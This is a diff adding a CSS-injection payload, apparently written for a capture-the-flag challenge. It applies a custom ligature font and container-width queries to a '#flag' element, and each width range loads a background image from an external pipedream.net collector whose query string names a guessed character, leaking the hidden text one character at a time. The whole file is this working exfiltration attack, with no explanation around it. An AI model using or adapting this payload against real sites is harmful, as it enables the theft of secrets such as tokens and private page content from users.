@@ -1,0 +1,18 @@
+body{background-image:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=CQV4')}
+@font-face{font-family:cqp;src:url('https://uh4ck3r.github.io/ctf/cq_xs0.woff2');font-display:swap}
+#page{content-visibility:hidden;animation:unveil 0.001s 2s forwards}
+@keyframes unveil{to{content-visibility:visible}}
+#flag{display:block!important;opacity:0;font-family:cqp;font-size:15px;width:max-content;container-type:inline-size;container-name:cqflag;white-space:pre;font-variant-ligatures:common-ligatures;font-feature-settings:"liga" 1,"clig" 1}
+@container cqflag (max-width:59px){#flag::after{content:'';display:block;height:1px;background:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=NO_LIG')}}
+@container cqflag (min-width:60px) and (max-width:119px){#flag::after{content:'';display:block;height:1px;background:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=c0_a')}}
+@container cqflag (min-width:120px) and (max-width:179px){#flag::after{content:'';display:block;height:1px;background:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=c0_b')}}
+@container cqflag (min-width:180px) and (max-width:239px){#flag::after{content:'';display:block;height:1px;background:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=c0_j')}}
+@container cqflag (min-width:240px) and (max-width:299px){#flag::after{content:'';display:block;height:1px;background:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=c0_p')}}
+@container cqflag (min-width:300px) and (max-width:359px){#flag::after{content:'';display:block;height:1px;background:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=c0_s')}}
+@container cqflag (min-width:360px) and (max-width:419px){#flag::after{content:'';display:block;height:1px;background:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=c0_y')}}
+@container cqflag (min-width:420px) and (max-width:479px){#flag::after{content:'';display:block;height:1px;background:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=c0_z')}}
+@container cqflag (min-width:480px) and (max-width:539px){#flag::after{content:'';display:block;height:1px;background:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=c0_0')}}
+@container cqflag (min-width:540px) and (max-width:599px){#flag::after{content:'';display:block;height:1px;background:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=c0_1')}}
+@container cqflag (min-width:600px) and (max-width:659px){#flag::after{content:'';display:block;height:1px;background:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=c0_4')}}
+@container cqflag (min-width:660px) and (max-width:719px){#flag::after{content:'';display:block;height:1px;background:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=c0_5')}}
+@container cqflag (min-width:720px) and (max-width:779px){#flag::after{content:'';display:block;height:1px;background:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=c0_7')}}
